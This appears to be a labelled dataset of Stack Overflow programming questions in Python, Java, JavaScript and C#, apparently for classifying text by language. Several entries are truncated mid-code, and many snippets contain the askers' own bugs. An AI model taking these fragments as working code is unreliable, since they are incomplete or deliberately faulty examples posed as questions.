python syntaxerror when creating a list using a generator  i m relatively new to python and i m just trying to get to grips with some of the common features.    i tried to write a simple script to get all the whole number square roots of numbers between 0 and 100. this is what i came up with:   <pre><code>mylist = [n for n*n in xrange(0 101)] </code></pre>   i got a syntaxerror when i ran it  and as far as i can tell  it s not liking the  n for n*n in  bit. am i right in deducing that this is just not possible  is there a way to achieve this  or do i need a sqrt() function     thanks,python
javascript how `length` is implemented  you know that in javascript you can access the length of an text/array with length property:   <pre><code>var obj = [ robert    smith    john    mary    susan ];  // obj.length returns 5; </code></pre>   i want to know how this is implemented. does javascript calculates the length property when it is called  or it is just a static property which is changed whenever the array is changed. my question is asked due to the following confusion in best-practices with javascript:   <pre><code>for(var i = 0; i &lt; obj.length; i++) {  } </code></pre>   <strong>my problem:</strong> if it is a static property  then accessing the length property in each iteration is nothing to be concerned  but if it is calculated on each iteration  then it cost some memory.    i have read the following definition given by ecmascript but it doesn t give any clue on how it is implemented. i m afraid it might give a whole instance of array with the length property calculated in run-time  that if turns out to be true  then the above <code>for()</code> is dangerous to memory and instead the following should be used:   <pre><code>var count = obj.length; for(var i = 0; i &lt; count; i++) {  } </code></pre>,javascript

java adding two arrays of objects  done quite a but of digging but cant seem to find an answer.    i have 2 object arrays. these objects are session counts  which contain data about our servers. each <code>sessioncount</code> object has:   <ul> <li>date</li> <li>hour</li> <li>number of connections</li> </ul>   so of the two <code>sessioncount</code> arrays  i need to match up the objects date and hour  then use that to add the number of connections for that time. any ideas,java
"In csproj file, we can include a file using either <code>None</code> or <code>Content</code> element. From MSDN, it says that:

<blockquote>
  None - The file is not included in the project output group and is not
  compiled in the build process. An example is a text file that contains
  documentation, such as a Readme file.
  
  Content - The file is not compiled, but is included in the Content
  output group. For example, this setting is the default value for an
  .htm or other kind of Web file.
</blockquote>

But since either <code>None</code> or <code>Content</code> element can contains a <code>CopyToOutputDirectory</code> element, thus I wonder if I set this to be <code>Always</code>, wouldn't the behavior of <code>None</code> and <code>Content</code> be the same?

how come i can implicitly but not explicit cast   i was testing around with java and noticed that casting  physically  changes properties of an object. i don t quite understand what actually happens inside java when casting is used  but i did notice this:    here is my super class <code>instancevariable</code>:   <pre><code>package inheritance;  public class instancevariable {     public int x = 1; } </code></pre>   here is a class that inherits from it:   <pre><code>package inheritance;  public class instancevariable1 extends instancevariable {      public int x = 100;     public static int y = 2;       public static void main(string[] args) {         instancevariable1 one = new instancevariable1();         instancevariable two = new instancevariable1();         system.out.println(one.x +     + two.x);         one = (instancevariable) one; //this is illegal     } } </code></pre>   first of all  the instance variable that were instantiated are overriden by the child class. and secondly  i can implicitly cast the super class (that is <code>instancevariable</code>) to <code>two</code>  but for some reason  i cannot explicitly cast it to <code>one</code>  what is the reason for this,java

"I have created a new web site using Visual Studio 2017.  The target framework for this site is NetCoreApp 1.1.  As this is an MVC project, it references a number of Microsoft and third-party dlls from Nuget.  I also have a data project that I created as a library.  It is Netstandard1.6.  When I build the solution, none of the dlls from the Nuget packages are copied to the bin folder.  This causes the app to crash with a FileNotFound exception when attempting to debug it.  The project references are being copied correctly, so it appears to only be a problem with Nuget packages.  As a workaround, I can publish the project and copy that output to the bin folder, but I shouldn't have to do that, should I?

"I have a asp.net Core web API with the following structure:

<pre><code>View Layer: API endpoints
    |
    V
Controller Layer: Controller classes implementing endpoints
    |
    V
Business Logic Layer: Services
    |
    V
Data Access Layer: Proxy classes to our backend
</code></pre>

There are a series of endpoints that all follow this structure. Most of the APIs are purely data queries to a backend, but some of the APIs do allow for the calling client to submit data, as well.

What I'm struggling with is finding a clean way to consolidate the various validations that must occur on this submitted data. 

My original intent was that the Controller layer would be very simple and hand off all real work (including validation) to the Services layer, and the Controller layer would only be responsible for sending the appropriate HTTP response. My issue, though, is that with the service doing all the real work, how best to communicate back up to the Controller what it should be returning. 

I can capture some of the basic validations using data annotations, and in most cases that might actually be enough in terms of data validation. But that doesn't cover other issues like more complex validations, or failures in the service/data access layer WRT read/writes, etc. 

Some ideas I've mulled over:

<ul>
<li>Make the services layer aware of the IActionResult interface and make it responsible for determining what to return to the calling client. This then mixes the Controller and Service layer, but makes the Controller layer pretty lean.</li>
<li>Create various OperationResults objects for the various Services calls which would encapsulate any error messages, exceptions, error codes, etc, to be interpreted by the Controller layer to determine what http response to send back to the client. This is a cleaner separation since the Service layer wouldn't mix with the http code at all, but does then turn the Controller classes into a big set of switches to determine what to send back. </li>
<li>Split up the validation based on what makes sense to capture at the Controller vs. Services level. For example, a controller being passed a null object to save should clearly just reject it and return BadRequest(), but it seems redundant to add the check there when the services layer would have its own reasons for wanting to check that, too. </li>
</ul>

I'm admittedly somewhat new to .net web API and .net core in general, so if there's some obvious functionality available I'm not taking advantage of, I'd love to know.

Any advice would be appreciated, thanks.

how can i know the maximum number of runnable threads allowed on the current jvm   i have a multi-threaded application that runs in several different environments and i think that sometimes the environment limits the total number of threads that can be run at the same time.  in particular  i think one of the systems is only allowing a single thread to run so there is no benefit to the multi-threading.  what s an easy way to tell when this happens    <pre><code>executorservice exec = executors.newfixedthreadpool(4); testrunnable tr = new testrunnable(); for ( int i = 0; i &lt; 20; i++ ) {   try {      exec.execute(sr);   } catch (exception e) {   } } </code></pre>,java

python methods to find duplicates  is there a way to find if a list contains duplicates. for example:   <pre><code>list1 = [1 2 3 4 5] list2 = [1 1 2 3 4 5]  list1.*method* = false # no duplicates list2.*method* = true # contains duplicates </code></pre>,python
javascript returning  undefined  when using .text   i know with <code>.value</code> i can get the value of the item selected  but what i need is the name of the selected item. for example  i have this drop down menu with contains two items: class 1 and class 2. the value of class 1 is 50 and the value of class 2 is 60. if i use dmt5.value (class 1 s value) i get 50  but what i need is the name itself which is  class 1 . so  i tried using this code :   <pre><code>var classrate = document.getelementbyid( dmt5 ) var selectedclassrate = classrate.options[classrate.selectedindex].text </code></pre>   however  i get an error: unable to get property  text  of undefined or null reference    *edit:  here s dmt5:   <pre><code>&lt;td style= padding-right: 9px;

why is object property changed for all instances   i wanted to encapsulate the position of a sprite within another object. so that instead of using <code>tile.x</code> and <code>tile.y</code> i would access via <code>tile.position.x</code> and <code>tile.position.y</code>.    yet once i set the value of <code>tile.position</code> within the init-method <em>all</em> the instances of the tile-object change to the same value. why is that     as when i set <code>tile.x</code> everything works as expected  meaning each object gets the right value.    this is how i create the multiple instances:    in a for loop i am creating multiple instances of said object:   <pre><code>for (var y = 0; y &lt; 10; ++y) {   for (var x = 0; x &lt; 10; ++x) {     var tile = object.create(tileproperty);     tile.init(x  y);     ...   } } </code></pre>   and this is the cloned object:   <pre><code>var tileproperty = {     // this works     x: null       y: null      // this will get changed for all instances     position: {          x: null          y: null     }      init: function(x  y) {         this.name = x.tostring() + y.tostring();         this.x = x;         this.y = y;         this.position.x = x;         this.position.y = y;         this.canvas = document.createelement( canvas );         var that = this;         $(this.canvas).bind( click   function() {             console.log(that.position  that.x  that.y);         });          document.body.appendchild(this.canvas);     } } </code></pre>,javascript
"I sometimes need to post larger JSON request payloads to my ASP.Net Core Controllers. The size of the payload warrants (at least in my opinion) compressing it. Because ASP.Net Core Controllers do not appear to support compressed request content out of the box, I've rolled my own middleware.

can someone explain how to use str.index and str.find and why the following code is wrong  i m very new to python and have been trying out codewars. some problems pretty difficult for me. what i m trying to accomplish is  to know the index of the vowels in a given word  for example  there are two vowels in the word super (the second and fourth letters).  i don t really understand how to use index and/or find. i need to know i can edit this code to find the positions of the vowels in any given word.   <pre><code>def vowel_indices(word):     word.index( a   i   o   u   e   y )     word.find( a   i   o   u   e   y ) </code></pre>,python

how to do generic copy constructor in java  could you please advise or give some hints how to do following. i have pojo lets say it is called bankhistorydata. i would like to copy data from two tables into this pojo (main table - bank and its archive - bankarchive). tables have a lot of fields which are basiclly the same  so i would not like to repeat my self.<br> i googled around and found a tool that could help me with this - java generic constructor. but  i am a little bit new with generics and not sure how exactly to do it.<br> i suppose i should have something like this:     <pre><code>public class bankhistorydata&lt;t extends serializable&gt; {     // i would like to set this fields from the object t     private field1;     private field2;     // and many more ...      t a; // source object from which to copy values     public bankhistorydata(t a) {         this.a = a;         copydata();     }       // not sure about this ... something like this     public void copydata() {       if(t instanceof bank) {          this.field1 = ((bank)a).getsomefield();         // and so on ...       } else if (t instanceof bankarchive) {          this.field1 = ((bankarchive)a).getsomefield();          // and so on ...       } else {          trow new illegalargumentexception( not supported table );       }     } } </code></pre>   any suggestions are welcome. thanks!    mismas    [edit] i have decided not to use generic for this  as i think those 2 cents from @alex where for that. instead i will do this copy logic in my business logic service layer (pojo will remain  stupid ).<br> although  i will make those two hibernate objects to implement common interface (only getter methods of shared fields will be here). and finally  i will make a copy method on my business logic service layer and make it to take that interface parameter for copying fields.<br> hope this will help someone. also  any comments are welcome.<br> cheers!,java

        bool b3 = e3 != 0;  // = true
        bool b4 = e4 != 0;  // = true   

Upper Codes in other way(simpler) :   
 

        const int a = 1 << 0;  // = 1
        const int b = 1 << 1;  // = 2
        const int c = 1 << 2;  // = 4
        const int d = 1 << 3;  // = 8
    
        int flag = 15;  // = 1 + 2 + 4 + 8
    
        bool b1 = (flag & a) != 0;  // = true
        bool b2 = (flag & b) != 0;  // = true
        bool b3 = (flag & c) != 0;  // = true
        bool b4 = (flag & d) != 0;  // = true   

I need a **Reverse Formula** to return `flag` value when we set :   
**b1 , b2 , b3 , b4** variables and make them constant.   

So we have `2*2*2*2 = 16` different situations. mean `(true|flase)*(true|flase)*(true|flase)*(true|flase) = 16`   

With which method we can figure out what should `flag` be?   

Mean :   

        const int a = 1 << 0;  // = 1
        const int b = 1 << 1;  // = 2
        const int c = 1 << 2;  // = 4
        const int d = 1 << 3;  // = 8
    
        int flag = ?;
    
        bool b1 = (? & a) != 0;  // = true > I WANT b1 True
        bool b2 = (? & b) != 0;  // = false > I WANT b2 False
        bool b3 = (? & c) != 0;  // = false > I WANT b3 True
        bool b4 = (? & d) != 0;  // = true > I WANT b4 False

For example i want `b1 True , b2 False , b3 True , b4 False`. So What is the flag?   
Or   
I want  `b1 False, b2 False , b3 True , b4 False`. So What is the flag?   
How did you find it and give me a method to calculate it!   
<hr>
In my example `flag` is 15 (sum of a+b+c+d) and in this way all `b` variables are true.

enhanced messageformat   i ve been using <code>messageformat.format()</code> for a while  but there s one thing that i find annoying.    everytime you declare a parameter in a message  you have to know the position of the mapped argument. e.g.   <pre><code>messageformat.format( {0} is annoying {1}.    this    indeed ) </code></pre>   is there a class that is the same as <code>messageformat</code> in every other way but lets you omit the argument position in parameter declaration altogether and have it default to its position in the message so that the first parameter maps to the first argument  the second parameter to the second argument and so on  e.g.   <pre><code>messageformat.format( {} is much better{}.    this    indeed ) </code></pre>   i think later versions of log4j have a similar feature  but i just need the formatting class.    happy new year!    <strong>edit</strong>: i need this feature for assertion  so it s really for internal use  but i appreciate your insight into why messageformat works the way it does.,java
python - output is blank after a for loop  i m a beginner of python  and i d like to compare two files. here is my idea: compare two files line by line  and write them to a third file with the difference in comparison. then i d like to make the output more clear that i compare the line number of each file first  but what i found is that after for loop  the third file which is the result one is blank. and it s ok if i delete for loop for the two file. here is the script:   <pre><code>import difflib import sys with open( file1   r ) as file1:   with open ( file2   r ) as file2:     line_num1=sum(1 for line in file1)     line_num2=sum(1 for line in file2)     diffinstance = difflib.differ()     difflist = list(diffinstance.compare(file1.readlines()  file2.readlines()))   with open ( result    w ) as result:     for i line in enumerate(difflist):       result.write(line)     if line_num1 == line_num2:       if line.startswith( + ):          sys.stdout.write( current-line: {}  text: {} .format(i-1 line))       elif line.startswith( - ):          sys.stdout.write( previous-line: {}  text: {} .format(i+1 line))                          elif line_num1 &gt; line_num2:       x = line_num1-line_num2     elif line_num1&lt;line_num2:       y = line_num2-line_num1 </code></pre>,python

"I'm trying to port some .net code to the new Core runtime and I'm having a bad time porting some on-the-fly compilation.

To resume, it always asks me for a reference to System.Runtime and mscorlib, but have no clue on how to reference them.

As a side note, I can't reference Framework 4.6 as the project must be published to a Linux machine with .net Core.

This is the minimum code:

<pre><code>        string testClass = @using System; 
        namespace test{

         public class tes
         {

           public string unescape(string Text)
          { 
            return Uri.UnescapeDataString(Text);
          } 

         }

        };

        var compilation = CSharpCompilation.Create(Guid.NewGuid().ToString() + .dll)
            .WithOptions(new CSharpCompilationOptions(Microsoft.CodeAnalysis.OutputKind.DynamicallyLinkedLibrary))
            .AddReferences(
            MetadataReference.CreateFromFile(typeof(Object).GetTypeInfo().Assembly.Location),
            MetadataReference.CreateFromFile(typeof(Uri).GetTypeInfo().Assembly.Location)

            .AddSyntaxTrees(CSharpSyntaxTree.ParseText(testClass));

        var eResult = compilation.Emit(test.dll);

It always complains about the need of mscorlib (in this example) and System.Runtime (in my real project).

storing a printed line into a string   i d like to know if there is any way to store a series of texts which are printed using system.out.print into a specific string so that it can be used to recall the line in the future.    for example :   <pre><code>string oldline=null; int x = 4; for (int i=0; i&lt;10; i++) { int result = x+i; system.out.print(result+ \t ); } </code></pre>   the result would be then something like:   <pre><code>4   5  6  7  9  10 .... </code></pre>   now i d like to know if i can store this line into:   <pre><code>string oldline; </code></pre>   so whenever i print oldline i can print the same line as :    <pre><code>4   5  6  7  9  10 ....    </code></pre>,java
how to use a for loop to loop through all the numbers between two integers in java  so i am completely stumped on how to do this  any help would be greatly appreciated  what i want to do is basically get all the numbers between two integers.    so say i had the numbers: 254 and 259  i would want to output the following numbers: 255  256  257  258    also i will want to add these numbers to a list and be able to output how many numbers are in that list  so in this case there would be 4 numbers in the list.    i am using this to cycle through an area of land.,java

using a list in a string.format in python 2.7   let s assume i have a explicitly defined list  with a known number of (numeric) elements  say <code>aa=[1 2 3 4 5]</code> - and i d like to print these in a specific string. i m aware i can do this:   <pre><code>$ python python 2.7.6 (default  nov 23 2017  15:49:48)  [gcc 4.8.4] on linux2 type  help    copyright    credits  or  license  for more information. &gt;&gt;&gt; aa=[1 2 3 4 5] &gt;&gt;&gt; print  %dx%d+%d+%dx%d %tuple(aa) 1x2+3+4x5 </code></pre>   ... but i m not very fond of how the format string <code> %dx%d+%d+%dx%d </code> looks like  and i d much rather use <code>string.format</code> kind of specifiers. then  i m aware i can use this:   <pre><code>&gt;&gt;&gt; print  {}x{}+{}+{}x{} .format(aa[0]  aa[1]  aa[2]  aa[3]  aa[4]) 1x2+3+4x5 </code></pre>   ... but i find writing all the arguments for <code>string.format</code> expanded as <code>aa[0]  aa[1]  aa[2]  aa[3]  aa[4]</code> a bit overkill  since in this case  i explicitly know i have enough <code>{}</code> specifiers for all the elements of the array/list  so i d much rather just throw <code>aa</code> in there  as in:   <pre><code>&gt;&gt;&gt; print  {}x{}+{}+{}x{} .format(aa) traceback (most recent call last):   file  &lt;stdin&gt;   line 1  in &lt;module&gt; indexerror: tuple index out of range </code></pre>   ... but unfortunately  that doesn t work.    so  what would be a way - if there is one -  to just refer to a list like <code>aa</code> in the argument of <code>string.format</code>  without having to specifically expand each of its elements as a separate argument,python

"Firstly please forgive me as I am still trying to get to grips with C# and OOP.

I am trying to build a simple console shopping basket as part of a challenge and I have a number of products which I need to be able to pull on to populate 5 different scenarios of the basket.

However I am unsure as to the best approach to listing each of the products which each have three different values (Desc, Dept, Price) and I wish to be able to select the items I need through a array, possibly.

Currently I have the items listed as such:

<pre><code>        itemOnePrice = 10.50m;
        itemTwoPrice = 54.65m;
        itemThreePrice = 03.50m;
        itemOneDept = Clothing;
        itemTwoDept = Clothing;
        itemThreeDept = Head Gear;
        itemOneDesc = Hat;
        itemTwoDesc = Jumper;
        itemThreeDesc = Head Light;

I have looked at Lists and at Tuple, but I haven't been able to figure out how to really make these work for me. Can somebody please explain the best approach to list these products to pull from to populate my basket contents.

are the comparison operators for sets in python 3.3 broken   here s the code that i used:   <pre><code>&gt;&gt;&gt; a = set([1 2 2]) &gt;&gt;&gt; b = set([1 1 2]) &gt;&gt;&gt; a     {1  2  2} &gt;&gt;&gt; b     {1  1  2} &gt;&gt;&gt; a &lt;= b     true  &gt;&gt;&gt; a.__le__(b)     true </code></pre>   clearly <code>a</code> is not a subset of <code>b</code>. also  looking at the documentation code from collections.py  i m a bit worried since this is something crucial  as in the docstring for the class <code>set</code> we have them say   <pre><code>   ... to override the comparisons (presumably for speed  as the semantics are fixed)  all you have to do is redefine __le__ and then the other operations will automatically follow suit.    </code></pre>   all other methods use <code>__le__</code>. so am i alone on this one,python

how to delimit the range of an instance variable of a class in java   i am doing some java exercise and trying to figure out a way to impose restrictions on the scope of an instance variable.    for example i constructed a class called time. it has 3 instance variables  hour  minute and second.    take hour for example  it should be between 0 to 23. i have some methods inside this class to manipulate the hour variable. but i need to make sure hour is always within 0 to 23.    i know there is a method  enum type. like this   <pre><code>public enum hour {     0  1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20      21  22  23 } </code></pre>   and then insert an hour type variable in time class.    but what if hour is a double type variable  continuous variable. and it has its upper and lower limit. how do i delimit a continuous variable,java

what are the benefits and drawbacks of using the  this  keyword in a constructor function over the prototype property   in the following code i instantiate an object and it inherits properties in two completely different ways.      <pre><code>function c(){     this.k1 =  v1 ; } c.prototype.k2 =  v2 ; var o = new c; </code></pre>   the first (k1) seems to attach to the instantiated object (o) as an  own  property  the second (k2) does not attach to anything in the instantiated object but seems to just access it s value through the _ _ proto _ _ property (or [[prototype]]).  in a way it seems like the first way is analogous to (in every computing) making a  copy  of a file on your desktop whereas the second way is analogous to making an  alias  of a file on your desktop  and of course  in this analogy i m makin  files  are analogous to  properties .     i m wondering if this is the correct way of imagining what s taking place and if so what the benefits and drawbacks are to using one method over the other.  i m assuming that using the prototype property saves memory because it doesn t force the newly instantiated object (o) to have keys (k1) as an  own  property  but maybe i m wrong.    why would anyone choose one method over another,javascript

"In my understanding, JIT-ed code never gets released from memory while the program is running. Does this mean that repeatedly calling <code>.Compile()</code> on expression trees leaks memory?

The implication of that would be to only compile expression trees in static constructors or cache them in some other way, which may not be as simple. Right?

"so right now I'm using <code>Microsoft.Bot.Builder.Dialogs.Conversation.SendAsync</code> and <code>Microsoft.Bot.Builder.Dialogs.Conversation.ResumeAsync</code> to implement a way to pause and resume conversation but it seems impossible to 'exit' or go back to the previous state. It's stuck in the conversation dialog.

Do I just implement a 'Cancel' command? If so, what data do I need to clear so that it will be back to the original state?

<pre><code>    public static readonly IDialog&lt;string&gt; dialog = Chain
        .PostToChain()

                return regex.IsMatch(msg.Text);
            }, (ctx, msg) =&gt;
            {
                return Chain.ContinueWith(new ChatDialog(msg),
                            async (context, res) =&gt;
                            {
                                var token = await res;
                                //var valid = await Helpers.ValidateAccessToken(token);
                                //var name = await Helpers.GetProfileName(token);
                                var name = User;
                                context.UserData.SetValue(name, name);

            })
        ).Unwrap().PostToUser();
</code></pre>

so if I send a 'login' it will go and start a new <code>ChatDialog</code> conversation but it seems to get stuck in this state. Even if I try to send another command, it will keep asking for login. Do I implement another <code>Case</code> class to handle a 'Cancel' command? Or should it automatically cancel the conversation when the user sends the same 'login' command more than once? Seems kinda clunky to have to send a 'cancel' command separately.

python linesplitting into sections  hi i am uncertain on how to solve a problem i have that involves linesplitting. i need to read lines that have the following format. line appearance have been altered with placeholder names for easier reading.   <pre><code>/etc/xxx/gainvaluex       s32         5  4  3  2  1  6  7  10 </code></pre>   what i am aiming to do is split parts of the line into three different variables. one for the  /etc/xxx/...  part  one for the  s32  part and one for all the numbers in the line. the problem is that the parts with the numbers are separated with commas while the others merely have a space between them.    heres how my code looks this far   <pre><code>for line in ins:¨         pieces = line.split()         addressparam = pieces[0]         datatype = pieces[1]          num = line.split(   )          for numbers in num:             print(numbers) </code></pre>   here i split the line into sections in the  pieces  variable and then i can atleast easily get the first and second part of the line into addressparam and datatype variable without any difficulty. the problem is as stated with the number part. when doing a testrun and printing the num variable i not only get the numbers but the other parameters aswell. here s an example of how a run of the script looks like    <pre><code>/etc/xxx/gainvaluex         s32     -393  -368  -174  -68  69  177  276  374 </code></pre>   so to summarize. how do i properly save the numbers into a variable and nothing else after splitting the line the way i ve done so far  i hope i ve made myself clear and that the problem is easy to understand.,python

Now here's the part that get's interesting, which doesn't necessarily surprise me (due to the manner in which I especially that the C# compiler works), both the x86 and x64 assemblies have the same IL for the <code>RawModulo_5</code> method:

Now I'm not sure where to look next, but I suspect the issue is somewhere in the JITter, though I tested on RyuJIT and LegacyJIT, both had the same general result with the x64 architecture (though LegacyJIT was <em>slightly</em> slower overall). These are run in Release mode <em>outside</em> of Visual Studio, so I'm assuming there's no attached debugging session to be causing it.

So I'm curious, what is causing this? I have no idea how to investigate further, but if anyone has any ideas on further investigation steps, feel free to comment and I'll gladly try to perform them.

remove any properties whose values are numbers greater than the given number  :)    i need to remove properties whose values are numbers greater than the given number. i ve looked at this question: <a href= https://stackoverflow.com/questions/208105/how-do-i-remove-a-property-from-a-javascript-object rq=1 >how do i remove a property from a javascript object </a> and this one: <a href= https://stackoverflow.com/questions/40445193/remove-some-properties-from-array-of-javascript-objects >remove some properties from array of javascript objects</a> and this one: <a href= https://stackoverflow.com/questions/13244648/remove-item-from-array-javascript >remove item from array javascript</a> but i still cannot seem to get the desired answer i need. (they re either returning the numbers only or other parts of the array i don t need.)    this is the code i wrote:   <pre><code> function removenumberslargerthan(num  obj) { arr = []; for (var i = 0; i &lt; obj.length; i++) { return arr[i] &gt; 5; } } var obj = {   a: 8    b: 2    c:  montana  }; removenumberslargerthan(5  obj); </code></pre>   this is my result:   <pre><code>console.log(obj); // =&gt; { a: 8  b: 2  c:  montana  } </code></pre>   the correct console.log should be this though:    <pre><code>   { b: 2  c:  montana  } </code></pre>   any advice  thank you! ps: i m new and my questions seem to be getting marked down a lot even though i m trying to follow the rules. if i m posting incorrectly could someone please let me know what i m doing wrong if they re going to mark me down  this way i can improve. i m here to learn! :d thanks so much!,javascript

will  x == (x/10)*10;  be optimised away  context : we have business requirement that a value is reported at 3 or 4 digit string. if the string is 3 digits  it s value is actually *10.     e.g. 123 represents 1230  where as 4567 represents 4567.     when converting back from a stored integer to the string  the above code is seen as one way to determine this. the question we have is would the optimizer remove this code for x (integer and float). specifically looking at java  but the follow on question is how would other languages behave     the obvious other way to do this is use mod (x%10).,java

reading csv file from panda and plotting  i have 1000 files in which the data is stored in comma separation. the description of a file is given below:    the values are comma separated  <code>-9999</code> values should be ignored and if it can be read  all the values of row and column should be stored in numbers  as it has to used in plotting. the shape of file is [<strong>104 rows x 15 columns</strong>].    the few lines of the files are as follows:   <pre><code>0    9.8597e+00  129.944    1.071  6.7433e-06  1.0911e-05       -9999       -9999  3.7134e-07  3.5245e-05       -9999       -9999   26.295    -86.822   -123.017    0    8.7012e+00  130.908    0.966  1.9842e-06  1.0799e-05       -9999       -9999  3.5888e-07  7.8133e-05       -9999       -9999   27.140    -86.818   -122.322 </code></pre>   after reading into numeric values  i need to plot it into subplot also. like col1 vs col2   col3 vs col5 and so on....    any idea how to achieve it    <pre><code>import numpy as np import pandas as pd  import matplotlib.pyplot as plt  df1=pd.read_csv( small_file_106.txt  header=1) print(df1) </code></pre>,python

quicksort on 5000 element array  good morning folks    i wanted to get some clarity on the big o notation for a quicksort on an array of 5000 elements.  i am running the quicksort in random order (200  20  4 etc...)  sorted order (1  2  3  4  5 etc...) and reverse sorted order (4999  4998  4997  4996 etc....) and i am selecting the pivot from the middle.    when i look up the big o notation that tells me that for a quicksort it is o (n log n) which means to me.... when using base 2 log  o(5000 * 12.287712) = 61438.56  and if using base 10 log o(5000 * 3.69897) = 18494.85 so i am assuming i would use the 61438.56 and when i look at my output (posted below) it does not take nearly that long.    i am just trying to get an idea when doing comparison as to what i would generally expect to see from a random order  sorted order  and reverse sorted order test.  i have posted results of 5 runs through my java code and maybe i am over thinking it or doing the comparison in the wrong place but i guess i would have though there would have been a larger difference in comparisons on the different passes.    i can post my code if necessary  just had problems as i could not get it to indent 4 spaces and not sure if there is an automated way to do it.    1st run: random-order-number of swaps made 16196 sorted-order-number of swaps made 18242 reverse-sorted-number of swaps made 22790    2nd run: random-order-number of swaps made 16072 sorted-order-number of swaps made 18118 reverse-sorted-number of swaps made 22666    3rd run: random-order-number of swaps made 16205 sorted-order-number of swaps made 18251 reverse-sorted-number of swaps made 22799    4th run: random-order-number of swaps made 16333 sorted-order-number of swaps made 18379 reverse-sorted-number of swaps made 22927    5th run: random-order-number of swaps made 16283 sorted-order-number of swaps made 18329 reverse-sorted-number of swaps made 22877   <pre><code>    package quicksort;

developing a java application with database  sorry for this trivial question  but i am new to programming and i wanted to create a java app that can be distributed to other computers without having to install database on that computer.     the app is similar to an address book app where you store details about a person. is there a way to create something like that using netbeans which does not require a database or is there any other way to go about it..     i have searched for answers  but i guess i am not searching for the right keywords which i d appreciate if someone could enlighten me with.     ps: i know how to create an app like that in netbeans which is connected to a database (mysql or postgresql) but they cannot be moved from one computer to other  or can it be  i don t know.     thanks you in advance..,java
cant get out do while loop  i have a problem with my code  where i cant get out of a loop. i have to create a program where i input a number and then i am asked to enter an odd value greater than the first value. for example i input 12  and in order for the program to end  i have to input 13  15  17 or any odd number greater than 12. if i enter a number even it tells me to try again. if i input a odd number(3) lower than the value (12) it tells me that i have to input a value greater than 12.    i know how the logic to this program works  well i think i am doing it right.  ok when i run the program and input 12 for example  and then input the next value (15)  it does what it is supposed to do. but i input 12 and then input a number lower than 12 like 3 or or a even number instead of a odd value greater then 12  it keeps telling me to try again  even i input a good value like 15. basically the loop keeps repeating it self over and over again.     i am new to java so its hard for me to figure out what im doing wrong. i have researched while loops but  i can t figure out how to get out of the loops.     this is my code so far.    <pre><code>import java.util.*;  public class bonus2 { static scanner input = new scanner(system.in);  public static void main(string[] args) {     system.out.print( please enter any number:  );     int thevalue = getbigoddvalue(0);     system.out.printf( the value gotten was %d. \n   thevalue); }  private static int getbigoddvalue(int value) {     value = input.nextint();     system.out.printf( enter an odd number greater than   + value +  :  );     int cutoff = input.nextint();     int val = cutoff;      while (val % 2 == 0){         system.out.printf( the number is even. try again:  );         input.nextint();      }      while (val&lt;value){         system.out.printf( the number must be greater than   + value                 +  . try again:  );         input.nextint();     }       return cutoff; } </code></pre>   sample runs (how my runs should look like).   <pre><code>**call (and return displayed):** thevalue =getbigoddvalue(14); system.out.printf( the value gottenwas %d.\n  thevalue);   **machine-user interaction of above:** enter an odd number greater than 14: 2 the number is even. try again: 28 the number is even. try again: 11 the number must be greater than 14. try again: 3 the number must be greater than 14. try again: 18 the number is even. try again: 9 the number must be greater than 14. try again: 19 the value gotten was 19. </code></pre>,java

"Written the below code trying to identify all primes up 100. It's outputting 1,2 and 5. Can anyone see any reason why it wouldn't continue past the first 3?

write a java program using scanner to help you decide what to do this weekend  i need help with when asking the questions how do i get the question answered i think my teacher what me to use yes or no. how to i get the program to understand the yes or no and letting that equal true or false. below is the question and under that will be the code i already have.    decision trees imagine you only ever do three things at the weekend: go shopping  watch a movie  or just stay in. what you do depends on three things: the weather (good or bad); how much money you have (rich or poor) and whether your parents are visiting. you say to your yourself: if my parents are visiting  we ll go to the cinema. if they re not visiting and the weather s good and i m rich  then i ll go shopping. if they re not visiting  and the weather s good and i m poor  then i will go to the cinema.  if they re not visiting and the weather is bad and i m rich  i ll go to the cinema.  if they re not visiting and the weather is bad and i m poor  i ll stay in.     create a program asking whether the parents are visiting  whether the weather is good  and whether you are rich or poor.  your program should print  go to the cinema   go shopping  or  stay in  as appropriate.    hint:  there are two possibilities for the  parents visiting   question  two for the  is weather good   question  and two for the  are you rich   question.  that gives eight possible cases: truth table for did you ever have to make up your mind  are parents visiting    is the weather good     are you rich    what you do y   y   y<br> y   y   n<br> y   n   y<br> y   n   n<br> n   y   y<br> n   y   n<br> n   n   y<br> n   n   n    <pre><code>public class whatwedoing {     public static void main(string[] args) {         scanner input = new scanner(system.in);          int n;         int y;         boolean parentsvisiting = false;         boolean weathergood = false;         boolean imrich = false;           //prompt user to answer questions yes or no         system.out.print( are parents visiting  y or n  );         int parents = input.nextint();         system.out.print( is the weather good  y or n );         int weather = input.nextint();         system.out.print( are you rich  y or n );         int rich = input.nextint();          {             if (parentsvisiting == false &amp;&amp; weathergood == true &amp;&amp; imrich == true) {                 system.out.println( go shopping!  );             } else if (parentsvisiting == false &amp;&amp; weathergood == false &amp;&amp; imrich == false) {                 system.out.println( stay in! );             } else {                 system.out.println( cinema! );             }          }          system.out.println( what you should do is:  );      }  } </code></pre>,java
"I want to divide up a monolithic ASP.NET MVC website into multiple websites that can be developed independently, but retain a common public URL with associated SSL certificate - and it's a single host certificate, not a wildcard.
<a href=https://i.stack.imgur.com/fJA2k.png rel=nofollow noreferrer><img src=https://i.stack.imgur.com/fJA2k.png alt=Possible architecture></a>

The main URL for anonymous users of the public website will remain the same and will be a standard ASP.NET MVC website, though the technology used for this will be upgraded over time.

As to the other services, there may be quite a number of these and they may be running in the cloud, on a Raspberry Pi or something else. A lot of the response streams will be returned as text/html, though JSON will also be returned from some APIs.

For security, I was planning on using <a href=https://github.com/IdentityServer/IdentityServer4 rel=nofollow noreferrer>IdentityServer</a> as a Security Token Service (STS) (probably version 4 when it settles down), so that needs to be factored in - not least authentication cookie handling.

I don't even know what to call what I've dubbed this front end 'distributor', but I'm assuming it's going to be lightweight. I've seen a quick demo of a node server being used in a simplistic version of this role, but I don't know enough about node to have any idea what the limitations are of this strategy.

My preference is for a C# ASP.NET MVC solution because I'm familiar with that technology.

